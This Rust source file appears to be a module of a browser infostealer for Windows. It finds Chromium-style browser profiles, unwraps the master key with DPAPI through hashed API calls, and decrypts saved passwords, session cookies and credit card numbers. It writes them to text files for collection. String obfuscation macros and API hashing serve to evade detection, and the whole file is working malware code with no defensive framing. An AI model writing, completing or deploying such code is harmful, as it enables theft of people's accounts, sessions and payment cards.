use crate::sprotect;
use crate::sprotect_volatile;
use std::path::PathBuf;
use std::fs;
use rusqlite::Connection;
use serde_json::Value;
use dirs;

pub fn browser_exists(app_name: &str, author: &str) -> bool {
    if let Some(local_appdata) = dirs::cache_dir() {
        let path = if app_name.is_empty() {
            local_appdata.join(author).join(sprotect!("User Data"))
        } else {
            local_appdata.join(author).join(app_name).join(sprotect!("User Data"))
        };
        path.exists()
    } else {
        false
    }
}

pub async fn extract_browser_data(app_name: &str, author: &str, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let local_appdata = dirs::cache_dir().ok_or(sprotect!("Failed to get cache dir"))?;
    
    let base_path = if app_name.is_empty() {
        local_appdata.join(author).join(sprotect!("User Data"))
    } else {
        local_appdata.join(author).join(app_name).join(sprotect!("User Data"))
    };

    if !base_path.exists() {
        return Err(sprotect!("Browser path does not exist").into());
    }

    let local_state_path = base_path.join(sprotect!("Local State"));
    // TEST: Use volatile string for "Login Data" - auto-zeros after use
    let login_data_volatile = sprotect_volatile!("Login Data");
    let login_data_path = base_path.join(sprotect!("Default")).join(login_data_volatile.as_str());
    let cookies_path = base_path.join(sprotect!("Default")).join(sprotect!("Network")).join(sprotect!("Cookies"));
    let web_data_path = base_path.join(sprotect!("Default")).join(sprotect!("Web Data"));

    let mut master_key: Option<Vec<u8>> = None;
    if local_state_path.exists() {
        master_key = extract_master_key(&local_state_path);
    }

    if login_data_path.exists() {
        extract_passwords(&login_data_path, &master_key, output_dir).await?;
    }

    if cookies_path.exists() {
        extract_cookies(&cookies_path, &master_key, output_dir).await?;
    }

    if web_data_path.exists() {
        extract_credit_cards(&web_data_path, &master_key, output_dir).await?;
    }

    Ok(())
}

fn extract_master_key(local_state_path: &PathBuf) -> Option<Vec<u8>> {
    let content = fs::read_to_string(local_state_path).ok()?;
    let json: Value = serde_json::from_str(&content).ok()?;
    let encrypted_key = json.get(sprotect!("os_crypt"))?.get(sprotect!("encrypted_key"))?.as_str()?;
    
    let mut decoded = base64::decode(encrypted_key).ok()?;
    if decoded.len() < 5 {
        return None;
    }

    decrypt_with_dpapi(&mut decoded[5..])
}

fn decrypt_with_dpapi(data: &mut [u8]) -> Option<Vec<u8>> {
    use crate::api_resolve::HashedAPIs;
    use winapi::um::wincrypt::DATA_BLOB;
    use std::ptr::null_mut;

    unsafe {
        let mut input_blob = DATA_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_mut_ptr(),
        };

        let mut output_blob = DATA_BLOB {
            cbData: 0,
            pbData: null_mut(),
        };

        if HashedAPIs::crypt_unprotect_data(
            &mut input_blob as *mut _ as *mut std::ffi::c_void,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            0,
            &mut output_blob as *mut _ as *mut std::ffi::c_void,
        ) != 0 {
            let size = output_blob.cbData as usize;
            Some(Vec::from_raw_parts(output_blob.pbData, size, size))
        } else {
            None
        }
    }
}

fn decrypt_aes_gcm(key: &mut [u8], data: &[u8]) -> Option<String> {
    use aes_gcm::{Aes256Gcm, Key, Nonce, aead::{Aead, KeyInit}};

    if data.len() < 15 || &data[0..3] != sprotect!("v10").as_bytes() {
        return None;
    }

    let key = Key::<Aes256Gcm>::from_slice(key);
    let cipher = Aes256Gcm::new(key);
    let nonce = Nonce::from_slice(&data[3..15]);
    
    cipher.decrypt(nonce, &data[15..])
        .ok()
        .and_then(|plaintext| String::from_utf8(plaintext).ok())
}

async fn extract_passwords(login_data_path: &PathBuf, master_key: &Option<Vec<u8>>, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let temp_path = std::env::temp_dir().join(format!("{}{}", rand::random::<u64>(), sprotect!("_login_data")));
    fs::copy(login_data_path, &temp_path)?;

    let conn = Connection::open(&temp_path)?;
    let mut stmt = conn.prepare(&sprotect!("SELECT action_url, username_value, password_value FROM logins"))?;

    let mut passwords = Vec::new();
    let rows = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let username: String = row.get(1)?;
        let encrypted_password: Vec<u8> = row.get(2)?;
        Ok((url, username, encrypted_password))
    })?;

    for row in rows {
        if let Ok((url, username, mut encrypted_password)) = row {
            if !encrypted_password.is_empty() && !url.is_empty() {
                let password = if let Some(ref mut key) = master_key.as_ref().map(|k| k.clone()) {
                    decrypt_aes_gcm(key, &encrypted_password)
                        .or_else(|| decrypt_with_dpapi(&mut encrypted_password)
                            .and_then(|p| String::from_utf8(p).ok()))
                        .unwrap_or_default()
                } else {
                    decrypt_with_dpapi(&mut encrypted_password)
                        .and_then(|p| String::from_utf8(p).ok())
                        .unwrap_or_default()
                };

                if !password.is_empty() {
                    passwords.push(format!("{}{}{}{}{}",url, sprotect!(":"), username, sprotect!(":"), password));
                }
            }
        }
    }

    fs::remove_file(&temp_path).ok();

    if !passwords.is_empty() {
        let output_path = format!("{}\\{}", output_dir, sprotect!("passwords.txt"));
        fs::write(output_path, passwords.join("\n"))?;
    }

    Ok(())
}

async fn extract_cookies(cookies_path: &PathBuf, master_key: &Option<Vec<u8>>, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let temp_path = std::env::temp_dir().join(format!("{}{}", rand::random::<u64>(), sprotect!("_cookies")));
    fs::copy(cookies_path, &temp_path)?;

    let conn = Connection::open(&temp_path)?;
    let mut stmt = conn.prepare(&sprotect!("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies"))?;

    let mut cookies = Vec::new();
    let rows = stmt.query_map([], |row| {
        let host_key: String = row.get(0)?;
        let name: String = row.get(1)?;
        let encrypted_value: Vec<u8> = row.get(2)?;
        let path: String = row.get(3)?;
        let expires_utc: i64 = row.get(4)?;
        let is_secure: i32 = row.get(5)?;
        Ok((host_key, name, encrypted_value, path, expires_utc, is_secure))
    })?;

    for row in rows {
        if let Ok((host_key, name, mut encrypted_value, path, expires_utc, is_secure)) = row {
            if !encrypted_value.is_empty() && !host_key.is_empty() {
                let value = if let Some(ref mut key) = master_key.as_ref().map(|k| k.clone()) {
                    decrypt_aes_gcm(key, &encrypted_value)
                        .or_else(|| decrypt_with_dpapi(&mut encrypted_value)
                            .and_then(|p| String::from_utf8(p).ok()))
                        .unwrap_or_default()
                } else {
                    decrypt_with_dpapi(&mut encrypted_value)
                        .and_then(|p| String::from_utf8(p).ok())
                        .unwrap_or_default()
                };

                if !value.is_empty() {
                    let secure = if is_secure == 1 { sprotect!("TRUE") } else { sprotect!("FALSE") };
                    cookies.push(format!("{}\t{}\t{}\t{}\t{}\t{}\t{}", host_key, secure, path, sprotect!("FALSE"), expires_utc, name, value));
                }
            }
        }
    }

    fs::remove_file(&temp_path).ok();

    if !cookies.is_empty() {
        let output_path = format!("{}\\{}", output_dir, sprotect!("cookies.txt"));
        fs::write(output_path, cookies.join("\n"))?;
    }

    Ok(())
}

async fn extract_credit_cards(web_data_path: &PathBuf, master_key: &Option<Vec<u8>>, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let temp_path = std::env::temp_dir().join(format!("{}{}", rand::random::<u64>(), sprotect!("_webdata")));
    fs::copy(web_data_path, &temp_path)?;

    let conn = Connection::open(&temp_path)?;
    let mut stmt = conn.prepare(&sprotect!("SELECT card_number_encrypted, name_on_card, expiration_month, expiration_year FROM credit_cards"))?;

    let mut credit_cards = Vec::new();
    let rows = stmt.query_map([], |row| {
        let encrypted_number: Vec<u8> = row.get(0)?;
        let name_on_card: String = row.get(1)?;
        let expiration_month: i32 = row.get(2)?;
        let expiration_year: i32 = row.get(3)?;
        Ok((encrypted_number, name_on_card, expiration_month, expiration_year))
    })?;

    for row in rows {
        if let Ok((mut encrypted_number, name_on_card, expiration_month, expiration_year)) = row {
            if !encrypted_number.is_empty() {
                let number = if let Some(ref mut key) = master_key.as_ref().map(|k| k.clone()) {
                    decrypt_aes_gcm(key, &encrypted_number)
                        .or_else(|| decrypt_with_dpapi(&mut encrypted_number)
                            .and_then(|p| String::from_utf8(p).ok()))
                        .unwrap_or_default()
                } else {
                    decrypt_with_dpapi(&mut encrypted_number)
                        .and_then(|p| String::from_utf8(p).ok())
                        .unwrap_or_default()
                };

                if !number.is_empty() {
                    credit_cards.push(format!("{} {}/{} {}{}", number, expiration_month, expiration_year, sprotect!("Name:"), name_on_card));
                }
            }
        }
    }

    fs::remove_file(&temp_path).ok();

    if !credit_cards.is_empty() {
        let output_path = format!("{}\\{}", output_dir, sprotect!("creditcards.txt"));
        fs::write(output_path, credit_cards.join("\n"))?;
    }

    Ok(())
}